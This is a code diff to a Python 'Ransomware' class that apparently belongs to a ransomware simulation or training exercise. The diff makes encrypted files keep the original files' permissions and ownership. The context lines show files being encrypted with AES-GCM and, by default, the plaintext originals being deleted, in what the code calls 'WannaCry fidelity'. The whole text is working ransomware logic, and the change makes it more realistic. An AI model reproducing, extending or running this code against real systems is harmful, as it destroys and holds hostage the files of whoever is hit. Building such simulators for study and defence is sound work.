@@ -18,6 +18,7 @@ answer into the file key.
 """
 
 import json
+import os
 from pathlib import Path
 
 from software.core import events, guard as yom_guard, settings
@@ -108,7 +109,7 @@ class Ransomware:
             if folder.is_dir() and self.guard().folder_allowed(folder):
                 path = folder / name
                 if not path.exists():
-                    crypto.write_atomic(path, text.encode("utf-8"))
+                    crypto.write_atomic(path, text.encode("utf-8"), mode=0o644)
                     written.append(path)
         return written
 
@@ -145,10 +146,13 @@ class Ransomware:
 
         for path in targets:
             data = path.read_bytes()
+            mode = path.stat().st_mode & 0o777
             nonce, ciphertext = crypto.encrypt_blob(file_key, data, self._context(path))
             # WannaCry fidelity: the ciphertext lands under <name><suffix> and,
             # unless configured otherwise, the plaintext original is removed.
-            crypto.write_atomic(Path(str(path) + self.suffix), self.magic + nonce + ciphertext)
+            envelope = Path(str(path) + self.suffix)
+            crypto.write_atomic(envelope, self.magic + nonce + ciphertext, mode=mode)
+            _same_owner(envelope, path)
             if self.cfg.get("delete_originals", True):
                 path.unlink(missing_ok=True)
         del file_key
@@ -253,7 +257,8 @@ class Ransomware:
                           crypto.decrypt_blob(file_key, nonce, body, self._context(original))))
             echo(" integrity verified (AES-GCM)")
         for original, envelope, data in plain:
-            crypto.write_atomic(original, data)
+            crypto.write_atomic(original, data, mode=envelope.stat().st_mode & 0o777)
+            _same_owner(original, envelope)
             # Restore the original name by removing the ransomware envelope.
             envelope.unlink(missing_ok=True)
         if plain:
@@ -261,6 +266,15 @@ class Ransomware:
             self.emit("decrypted", files=len(plain))
         echo(f"{keylog['participant_id']}: {len(plain)} documents recovered and verified")
         return len(plain)
+
+
+def _same_owner(path: Path, like: Path):
+    """Give ``path`` the owner of ``like`` (best effort; needs root)."""
+    try:
+        st = like.stat()
+        os.chown(path, st.st_uid, st.st_gid)
+    except OSError:
+        pass
 
 
 # ---- the attacker side ------------------------------------------------------------
